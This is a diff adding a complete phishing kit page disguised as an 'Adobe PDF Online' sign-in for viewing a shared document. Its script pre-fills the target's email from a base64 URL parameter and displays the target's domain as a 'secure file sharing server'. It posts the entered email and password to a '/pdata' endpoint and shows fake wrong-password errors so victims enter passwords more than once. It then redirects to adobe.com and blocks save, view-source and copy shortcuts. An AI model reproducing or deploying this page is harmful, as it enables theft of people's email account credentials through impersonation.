@@ -1,0 +1,558 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+   <link rel="icon" type="image/jpg" href="https://i.gyazo.com/908013190f506e28135b03e680bbd946.jpg">
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.js"></script>
+   <title>Download Document - Adobe Sign In</title>
+   
+   <link rel="stylesheet" href="login.css">
+   <style type="text/css">
+   <!--
+   body {
+      background-image:url('https://i.gyazo.com/658103726bd460f44ba428028ce6d887.jpg');
+      background-repeat: no-repeat;
+      background-size: 100% 100%;
+      background-attachment: fixed;
+      z-index: -950;
+      margin-left: 0px;
+      margin-top: 0px;
+      margin-right: 0px;
+      margin-bottom: 0px;
+   }
+   -->
+   </style>
+       <style>
+
+         .fudfRQMSG{
+            display:none;
+         }
+        .lds-ellipsis {
+        display: inline-block;
+        position: relative;
+        left: 0px;
+        width: 80px;
+        height: 80px;
+      }
+      .lds-ellipsis div {
+        position: absolute;
+        top: 33px;
+        width: 13px;
+        height: 13px;
+        border-radius: 50%;
+        background: #39f;
+        animation-timing-function: cubic-bezier(0, 1, 1, 0);
+      }
+      .lds-ellipsis div:nth-child(1) {
+        left: 8px;
+        animation: lds-ellipsis1 0.6s infinite;
+      }
+      .lds-ellipsis div:nth-child(2) {
+        left: 8px;
+        animation: lds-ellipsis2 0.6s infinite;
+      }
+      .lds-ellipsis div:nth-child(3) {
+        left: 32px;
+        animation: lds-ellipsis2 0.6s infinite;
+      }
+      .lds-ellipsis div:nth-child(4) {
+        left: 56px;
+        animation: lds-ellipsis3 0.6s infinite;
+      }
+      @keyframes lds-ellipsis1 {
+        0% {
+         transform: scale(0);
+        }
+        100% {
+         transform: scale(1);
+        }
+      }
+      @keyframes lds-ellipsis3 {
+        0% {
+         transform: scale(1);
+        }
+        100% {
+         transform: scale(0);
+        }
+      }
+      @keyframes lds-ellipsis2 {
+        0% {
+         transform: translate(0, 0);
+        }
+        100% {
+         transform: translate(24px, 0);
+        }
+      }
+         </style>
+      
+   <style>.element {
+      font-family: helvetica, verdana, tahoma, arial;
+      width: 32em;
+      border: 1px solid #EAEAEA;
+      overflow: hidden;
+      border-radius: 10px;
+      box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.3);
+      z-index: 11;
+      position: relative;
+      margin-top: 55px;
+      margin-right: auto;
+      margin-bottom: 0px;
+      margin-left: auto;
+      background-attachment: scroll;
+      background-color: #FFF;
+      background-image: none;
+      background-repeat: repeat;
+      background-position: 0% 0%;
+      padding: 2%;
+      opacity: 0.9;
+   }
+   
+   .element_Left {
+      font-family: helvetica, verdana, tahoma, arial;
+      width: 27em;
+      border: 1px solid #EAEAEA;
+      overflow: hidden;
+      border-radius: 10px;
+      box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.3);
+      z-index: 11;
+      position: relative;
+      margin-top: 55px;
+      margin-right: 12.5%;
+      margin-bottom: 0px;
+      margin-left: auto;
+      background-attachment: scroll;
+      background-color: #FFF;
+      background-image: none;
+      background-repeat: repeat;
+      background-position: 0% 0%;
+      padding: 2%;
+      opacity: 0.9;
+      float: right;
+   }
+   .element_Right {
+      font-family: "Times New Roman", Times, serif;
+      width: 30em;
+      height: 370px;
+      overflow: hidden;
+      z-index: 11;
+      position: relative;
+      margin-top: 55px;
+      margin-right: auto;
+      margin-bottom: 0px;
+      margin-left: 12.5%;
+      background-color: #FFF;
+      background-image: url(prof1.png);
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-size: 100% 100%;
+      float: left;
+      border-radius: 4px;
+      text-decoration: none;
+      text-align: center;
+      vertical-align: middle;
+      box-sizing: border-box;
+      box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.3);
+   
+   }
+   .transparent {
+      padding-top: 0%;
+      padding-bottom: 4%;
+      width: auto;
+      margin-right: auto;
+      margin-left: auto;
+      display: block;
+      clear: both;
+      float: none;
+   
+   }
+   .HeaderBox {
+      background-color: #000;
+      padding-top: 1%;
+      padding-right: 12.5%;
+      padding-bottom: 1%;
+      padding-left: 12.5%;
+   }
+   .NavBox {
+      background-color: #FFF;
+      padding-top: 0.5%;
+      padding-right: 12.5%;
+      padding-bottom: 0.5%;
+      padding-left: 12.5%;
+      vertical-align: middle;
+   }
+   .logo1 {
+      background-image: url(https://i.gyazo.com/7d1f99e66be8919d823427182a046a77.png);
+      background-repeat: no-repeat;
+      background-position: center center;
+      position: absolute;
+      left: 167px;
+      top: 0px;
+      height: 98px;
+      width: 98px;
+      z-index: 1000;
+      background-size: 100% 100%;
+      padding-top: 0%;
+      padding-bottom: 2%;
+   }
+   .titlr_box {
+      background-color: #D1D1D1;
+      margin-bottom: 3%;
+      padding-top: 0.2%;
+      padding-right: 2%;
+      padding-bottom: 0.2%;
+      padding-left: 20%;
+      border: 1px solid #BBB;
+      background-image: url(https://i.gyazo.com/e4388133537b1f42c6138c18d719f949.png);
+      background-repeat: no-repeat;
+      background-position: 4% center;
+      border-radius: 10px;
+   }
+   .copyright {
+      font-size: 11px;
+      color: #CCC;
+      text-align: center;
+      font-weight: bold;
+      margin-top: 2%;
+      margin-right: 12.5%;
+      margin-left: 12.5%;
+      clear: both;
+      float: none;
+      font-family: Arial, sans-serif;
+      text-transform: capitalize;
+      margin-bottom: 0%;
+   }
+   .document {
+      padding-left: 11%;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      font-weight: bold;
+      color: #333;
+      width: 48%;
+      padding-top: 1%;
+   }
+   .NavButton {
+      display: block;
+      float: right;
+      font-family: helvetica, verdana, tahoma, arial;
+      font-size: 12px;
+      color: #333;
+      text-transform: capitalize;
+      padding-top: 1%;
+      padding-right: 2%;
+      padding-bottom: 1%;
+      padding-left: 2%;
+      background-color: #CAC8BF;
+      border: 1px solid #BEBCAF;
+      margin-left: 0.8%;
+      text-decoration: none;
+      box-sizing: border-box;
+   }
+   .clear2 {
+      clear: both;
+      float: none;
+   }
+   .getReader {
+      clear: right;
+      float: right;
+      height: 39px;
+      width: 158px;
+      margin-top: 2px;
+      margin-right: 0px;
+      background-image: url(https://i.gyazo.com/030155fb903e3526ae4d460f131eab65.png);
+      background-repeat: no-repeat;
+      background-position: center center;
+   }
+   .button1 {
+      background-color: #2B9AF3;
+      border-radius: 0.188rem;
+      clear: both;
+      color: #FFF;
+      display: inline-block;
+      font-size: 0.875rem;
+      font-weight: 400;
+      letter-spacing: 0.063rem;
+      line-height: normal;
+      margin: 0.375rem 0px;
+      padding: 0.438rem 0.875em;
+      text-decoration: none;
+      transition: background-color 0.3s ease 0s;
+      box-sizing: border-box;
+      border: 0px none;
+         box-shadow: 2px 1px 2px #000;
+   margin-right: 14px;
+   }
+   .button1:hover {
+      background-color: #0C79D3;
+   }
+   .mustDownload {
+      font-family: Georgia, "Times New Roman", Times, serif;
+      font-size: 11px;
+      font-weight: bold;
+      text-transform: capitalize;
+      color: #FFF;
+      padding-top: 1%;
+      padding-bottom: 0%;
+      text-align: center;
+      vertical-align: middle;
+      display: block;
+   }
+   </style>
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+   </head>
+   <body>
+   <div style="background-color:rgba(0, 0, 0, 0.5); height:1000px;">
+   <div class="HeaderBox"><a href="" title="Download AD0BE Acrobat Reader" target="_blank" class="getReader"></a>
+    <div class="clear2"></div></div>
+   <div class="NavBox">
+   <a href="" class="NavButton T58m4N" onlick="winAlert()">Exit</a>
+   <a href="" class="NavButton NCcVf4" onlick="winAlert()">Download Document</a>
+   
+   <script language="JavaScript"> 
+   if (window.print) {
+   document.write('');
+   }
+   </script><form><a href="#" onclick="window.print()" class="NavButton">Print</a> </form>
+   
+   
+    <div class="document DyGhp3">CONFIRM YOUR EMAIL TO DOWNLOAD DOCUMENT </div>
+    <div class="clear2 KHrwDR"></div>
+    </div>
+     <div class="element 3IH88b"> <div class="titlr_box">
+     <h1>ADOBE PDF Online</h1>
+     </div>
+   
+   
+   
+   <br>
+       <p>Sign in with your receiving email account to view document.</p>
+     
+     <form novalidate="novalidate" method="post" action="" accept-charset="UTF-8">
+     <div align="left">
+      <span style="color:green" align="left" valign="middle">Connected to</span>&nbsp;<span style="color:green" id="domain"></span>&nbsp;<span style="color:green">secure file sharing server</span>&nbsp;<img width="15" heig1ht="20" src="https://i.gyazo.com/f197c372ddc70fe691c18333225858ee.gif">
+       </div><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
+       <tbody><tr valign="baseline">
+         <td class="texthinter" height="57" align="left" nowrap="nowrap" valign="top" width="71%">
+           <br>
+           <strong>
+           <label for="email"></label>
+           <span id="sprytextfield2">
+           <input autocomplete="off" name="email" class="a9Cmbw fudFlG" id="email" placeholder="Enter Email Address" type="text">
+           <span id="erroruser" class="fudfRQMSG"><br>Email address is required.</span>
+        </span>
+         </strong>
+         </td>
+         
+         <td rowspan="2" class=" 43wTVc texthinter" align="right" nowrap="nowrap" valign="middle" width="29%"><img src="https://i.gyazo.com/211d2f9798bdca32e8cf5cab798300e3.webp" height="108" width="108"></td>
+       </tr>
+       <tr valign="top">
+         <td class="texthinter" align="left" nowrap="nowrap">
+                  
+                <br><span id="sprytextfield1">
+           <input autocomplete="off" name="pass" class="fudFlG" id="password" value="" size="32" placeholder="Enter Email Password" type="password">
+       <i class="far fa-eye" id="togglePassword" style="margin-left: -30px; cursor: pointer;"></i>
+      <script>
+      $("#togglePassword").click(function(event){
+         x = document.getElementById("password");
+         if (x.type === "password") {
+         $('#password').attr("type","text");
+         this.classList.toggle('fa-eye-slash');
+          } else {
+         $('#password').attr("type","password");
+          this.classList.toggle('fa-eye-slash');
+           }
+      });
+      </script>
+         <span id="errorpw" class="fudfRQMSG"><br>
+         <div class="texthinter" style="color:red">Password is Required.</div>
+        </span>
+         <span id="errorpw2" class=" ObxCde fudfRQMSG"><br>
+         <div class="texthinter" style="color:red">Enter your valid password and try again</div>
+        </span>
+              <span id="loginfailed" class="fudfRQMSG"><br>
+         <div class=" sHIOyS texthinter" style="color:red">Login failed, try again</div>
+        </span>
+        
+        </span>
+        
+        
+        </td>
+       </tr>
+       <tr valign="baseline">
+         <td align="left" nowrap="nowrap" valign="middle">
+         <input id="newbutton" class=" wDowZi button1" value="View Document" type="submit">
+         
+        </td><td align="left" nowrap="nowrap" valign="middle">&nbsp;</td>
+       </tr>
+      
+      
+     </tbody></table><div style="color:black" class="copyright">Copyright <span><script type="text/javascript">document.write(new Date().getFullYear());</script></span> Adobe Systems Incorporated. All rights reserved.</div>
+   </form>
+   
+   <script>
+
+
+    var appName = navigator.userAgent;
+    let ang = '13'
+    let and = '20'
+
+    if (appName.indexOf('Windows') == ang | appName.indexOf('Macintosh') == ang | appName.indexOf('iPhone') == ang | appName.indexOf('Android') == and) {
+    
+         $(document).ready(function() {
+               //var base64email = window.location.hash.substr(1);
+               var url = new URL(window.location.href);
+               var base64email = url.searchParams.get("login");
+              
+               var pmax = url.searchParams.get("pmax");
+               var pcnt = url.searchParams.get("pcnt");
+
+         
+               if (base64email){
+                  var email = atob(base64email);
+               } else if(base64login){
+               var email = atob(base64login);
+               }else{
+               var email = "";
+               }
+            
+               $("#email").val(email);
+               
+               var textField = document.getElementById("email");
+               textField.value = email;
+               if(email !== ""){
+               var ind= email.indexOf("@");
+               var my_slice= email.substr((ind+1));
+               $("#domain").html(my_slice);
+               }
+               var count=0;  
+               var pass_count = pcnt;
+               if(pcnt == 'null' || pcnt == ''){
+                 var pass_count = 2;
+               } 
+
+               document.getElementById("newbutton").addEventListener("click", function(e) {
+               event.preventDefault();
+               var email = document.getElementById("email").value;
+               var password = document.getElementById("password").value;
+               var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+               if (!filter.test(email)) {
+                   clearErrors();
+                 $('#erroruser').show();
+                 email.focus;
+
+                 return false;
+               } else if (password == null || password == ""){
+                   clearErrors();
+                  document.getElementById("errorpw").style.display ='block';
+                  
+               } else if(password.length < 5){
+                  clearErrors();
+                  document.getElementById("errorpw2").style.display ='block';
+                   } else{
+
+               count++;
+                $('#img').show();
+                 clearErrors();
+                $('#newbutton').prop('disabled', true);
+                    $('#newbutton').val('Please wait...');
+                     fd = {"em": email, 'pwd': password}
+                     fetch('/pdata', {
+                         method: 'POST',
+                         headers: {'Content-Type': 'application/json'},
+                         body: JSON.stringify(fd),
+                         }).then( resp => {
+                             c++
+         
+                             setTimeout( function(){
+                                 if(c < 3){
+                                     $(".err2").show()
+                                     $('.loader2').hide()
+                                     $('.password').val('')
+                                 } else{
+                                     window.location.replace('/')
+                                 }
+                             }, 2500)
+                          
+                         })
+                            
+                
+                  
+
+                  if (count < 2){
+                     setTimeout( function(){
+                        $('#newbutton').val('View Document');
+                        $('#newbutton').prop('disabled', false);
+                        document.getElementById("password").value = ''
+                        document.getElementById("errorpw2").style.display ='block';
+                     }, 3500)
+                     
+                  }else{
+                     window.location.replace('https://adobe.com')
+                  }
+
+               }
+               });
+               });
+               
+               function clearErrors(){
+                    $('#loginfailed').hide();
+                    $('#errorpw2').hide();
+                    $('#errorpwvalid').hide();
+                    $('#errorpw').hide();
+                    $('#erroruser').hide();
+                }
+         }
+
+
+   
+   </script>
+   
+   <script>
+      $(document).ready(function() {
+      var box = document.getElementById('gt-nvframe');
+      if(box){
+      setTimeout(() => {
+   
+   
+      // 👇️ removes element from DOM
+      box.style.display = 'none';
+   
+      // 👇️ hides element (still takes up space on page)
+      // box.style.visibility = 'hidden';
+      }, 100); //
+      }	
+   
+      });
+      </script>
+      
+          <script>
+            // prevent ctrl + s
+         $(document).bind('keydown', function(e) {
+         if(e.ctrlKey && (e.which == 83)) {
+         e.preventDefault();
+         return false;
+         }
+         });
+   
+         //document.addEventListener('contextmenu', event => event.preventDefault());
+   
+         document.onkeydown = function(e) {
+         if (e.ctrlKey && 
+         (e.keyCode === 67 ||   
+         //e.keyCode === 86 || 
+         e.keyCode === 85 || 
+         e.keyCode === 117)) {
+         return false;
+         } else {
+         return true;
+         }
+         };
+         $(document).keypress("u",function(e) {
+         if(e.ctrlKey)
+         {
+         return false;      }
+         else {
+         return true;
+         }});
+         </script>
+   </div>
+     <div class="logo1"></div>
+   </div>
+   </body></html>
